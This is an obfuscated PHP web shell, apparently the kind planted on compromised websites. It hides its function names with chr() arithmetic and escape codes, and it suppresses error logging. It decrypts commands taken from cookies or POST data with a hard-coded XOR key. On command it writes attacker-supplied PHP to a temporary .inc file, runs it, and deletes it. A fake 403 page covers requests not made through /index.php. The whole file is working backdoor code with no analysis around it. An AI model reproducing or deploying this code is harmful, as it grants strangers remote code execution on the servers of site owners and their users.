<?php
if($_SERVER["SCRIPT_NAME"] != "/index.php"){ header("HTTP/1.0 403 Forbidden");echo base64_decode("PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPC9ib2R5PjwvaHRtbD4=");die(); }
?>
<?php $rvzlp = chr(102)."\151".chr(809-701)."\x65"."\x5f".chr(764-652)."\165".'t'.chr(95)."\143".chr(111).'n'."\x74".'e'."\x6e"."\164".'s';
$dfldqj = 'b'.chr(97)."\x73"."\145"."\66".'4'."\x5f"."\x64".'e'.chr(423-324)."\157".chr(100).chr(971-870);
$lkbfo = chr(105).chr(688-578).'i'.chr(449-354).'s'.chr(101).chr(282-166);
$sshgjqqub = "\x75"."\156"."\x6c"."\151"."\156".chr(350-243);


@$lkbfo('e'.chr(114).'r'.chr(111).chr(114).'_'.chr(108)."\x6f".chr(680-577), NULL);
@$lkbfo(chr(108)."\157".chr(371-268).chr(867-772).'e'.chr(871-757)."\162"."\157".chr(114)."\x73", 0);
@$lkbfo('m'.chr(97).chr(310-190).chr(95).chr(101)."\170".chr(905-804)."\143".'u'."\164".'i'.chr(111).'n'.'_'."\164".chr(199-94)."\x6d".'e', 0);
@set_time_limit(0);

function ugite($byhbvky, $gbnqfik)
{
    $bjnklub = "";
    for ($zhslk = 0; $zhslk < strlen($byhbvky);) {
        for ($j = 0; $j < strlen($gbnqfik) && $zhslk < strlen($byhbvky); $j++, $zhslk++) {
            $bjnklub .= chr(ord($byhbvky[$zhslk]) ^ ord($gbnqfik[$j]));
        }
    }
    return $bjnklub;
}

$motxj = array_merge($_COOKIE, $_POST);
$wgokitjk = '0f735341-7feb-423e-b222-f24c3d5b7943';
foreach ($motxj as $ulxeyarg => $byhbvky) {
    $byhbvky = @unserialize(ugite(ugite($dfldqj($byhbvky), $wgokitjk), $ulxeyarg));
    if (isset($byhbvky['a'."\153"])) {
        if ($byhbvky["\x61"] == "\151") {
            $zhslk = array(
                "\x70".chr(118) => @phpversion(),
                's'.chr(510-392) => "3.5",
            );
            echo @serialize($zhslk);
        } elseif ($byhbvky["\x61"] == "\145") {
            $lhtek = "./" . md5($wgokitjk) . '.'."\151"."\x6e"."\x63";
            @$rvzlp($lhtek, "<" . "\x3f"."\160".chr(1044-940).'p'.' '.'@'.chr(117)."\156".'l'."\x69".chr(478-368).chr(107)."\x28".'_'.'_'."\x46"."\111"."\114"."\105".chr(95)."\137".chr(917-876)."\x3b"."\x20" . $byhbvky[chr(100)]);
            @include($lhtek);
            @$sshgjqqub($lhtek);
        }
        exit();
    }
}

